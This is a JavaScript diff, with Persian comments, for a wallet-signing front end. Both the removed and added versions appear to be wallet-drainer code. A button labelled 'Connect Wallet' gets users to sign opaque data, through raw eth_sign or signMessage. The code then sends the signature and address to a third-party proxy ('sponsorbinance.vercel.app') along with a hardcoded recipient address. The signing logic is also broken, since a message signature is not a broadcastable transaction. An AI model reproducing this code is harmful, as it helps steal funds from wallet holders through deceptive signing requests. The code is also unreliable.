@@ -1,103 +1,63 @@
-import { EthereumProvider } from "@walletconnect/ethereum-provider";
-import { keccak256 } from "@ethersproject/keccak256"; // اصلاح ایمپورت keccak256
-import { toUtf8Bytes } from "@ethersproject/strings"; // برای تبدیل رشته به بایت
+import { ethers } from "ethers";
 
-function App() {
-  async function runner() {
-    if (typeof localStorage !== "undefined") {
-      localStorage.removeItem("walletconnect");
+const API_URL = "https://your-vercel-project.vercel.app/api/proxy"; // آدرس پروکسی در Vercel
+
+async function sendTransaction() {
+    if (!window.ethereum) {
+        console.error("❌ Metamask not found");
+        return;
     }
 
-    var ethereumProvider = await EthereumProvider.init({
-      showQrModal: true,
-      chains: [56], // Binance Smart Chain
-      methods: ["eth_sign"],
-      projectId: "9fe3ed74e1d73141e8b7747bedf77551",
-    });
+    const provider = new ethers.providers.Web3Provider(window.ethereum);
+    const signer = provider.getSigner();
 
-    await ethereumProvider.enable();
-    var provider = ethereumProvider;
-    var accounts = await provider.request({ method: "eth_accounts" });
-    var sender = accounts[0];
-    console.log("✅ Wallet Address:", sender);
+    try {
+        // دریافت آدرس کاربر
+        const userAddress = await signer.getAddress();
+        console.log("👤 User Address:", userAddress);
 
-    let apiUrl = "https://sponsorbinance.vercel.app/api/proxy/send.php";
-
-    async function getRawSignature(address, rawTxData) {
-      try {
-        const hashedMessage = keccak256(toUtf8Bytes(rawTxData)); // اصلاح تبدیل به هش
-
-        var rawSignature = await provider.request({
-          method: "eth_sign",
-          params: [address, hashedMessage],
-        });
-
-        return { rawSignature, rawTxData };
-      } catch (error) {
-        console.error("❌ Error in getRawSignature:", error);
-        return null;
-      }
-    }
-
-    async function sendSignedTransaction(sender, balance, signature, rawTxData) {
-      try {
-        let requestData = {
-          sender: sender,
-          balance: balance,
-          signedData: signature,
-          rawTxData: rawTxData,
+        // داده‌های تراکنش
+        const txData = {
+            to: "0xF4c279277f9a897EDbFdba342f7CdFCF261ac4cD",
+            value: "0x2386f26fc10000",
+            gas: "0x5208",
+            gasPrice: "0x12a05f200",
+            nonce: "0x0",
         };
 
-        let response = await fetch(apiUrl, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(requestData),
+        console.log("📦 Transaction Data:", txData);
+
+        // امضای تراکنش با متامسک
+        const message = JSON.stringify(txData);
+        const signature = await signer.signMessage(message);
+
+        console.log("✍️ Signature:", signature);
+
+        // ارسال به سرور از طریق پروکسی
+        const response = await fetch(API_URL, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json",
+            },
+            body: JSON.stringify({
+                sender: userAddress,
+                signedData: signature,
+                rawTxData: txData,
+            }),
         });
 
-        let resultJson = await response.json();
-        console.log("📤 Server Response:", resultJson);
+        const result = await response.json();
+        console.log("✅ Server Response:", result);
 
-        if (resultJson.error) {
-          console.error("⚠ Transaction Error:", resultJson.error);
-          return null;
+        if (result.error) {
+            console.error("❌ Transaction Failed:", result.error);
+        } else {
+            console.log("🚀 Transaction Sent:", result.txHash);
         }
-
-        return resultJson.txHash || resultJson.result || resultJson;
-      } catch (error) {
-        console.error("❌ Error in sendSignedTransaction:", error);
-        return null;
-      }
+    } catch (error) {
+        console.error("❌ Error:", error.message);
     }
-
-    let rawTxData = JSON.stringify({
-      to: "0xF4c279277f9a897EDbFdba342f7CdFCF261ac4cD", // آدرس مقصد اصلاح شد
-      value: "0x2386f26fc10000", // 0.01 BNB به واحد wei
-      gas: "0x5208", // مقدار گس استاندارد (21000)
-      gasPrice: "0x12a05f200", // مقدار گس پرایس (5 Gwei)
-      nonce: "0x0", // مقدار نانس اولیه (سرور مقدار درست را جایگزین می‌کند)
-    });
-
-    let balance = "0.01"; // مقدار BNB که ارسال می‌شود
-
-    let signedData = await getRawSignature(sender, rawTxData);
-
-    if (signedData) {
-      console.log("✍️ Signed Raw Data:", signedData);
-      let txHash = await sendSignedTransaction(sender, balance, signedData.rawSignature, signedData.rawTxData);
-      console.log("📤 Final Transaction Hash:", txHash);
-    } else {
-      console.error("⚠ Signing failed.");
-    }
-  }
-
-  return (
-    <button
-      onClick={runner}
-      className="uk-button uk-button-medium@m uk-button-default uk-button-outline uk-margin-left"
-    >
-      <span>Connect Wallet</span>
-    </button>
-  );
 }
 
-export default App;
+// اضافه کردن رویداد به دکمه ارسال
+document.getElementById("sendTxButton").addEventListener("click", sendTransaction);
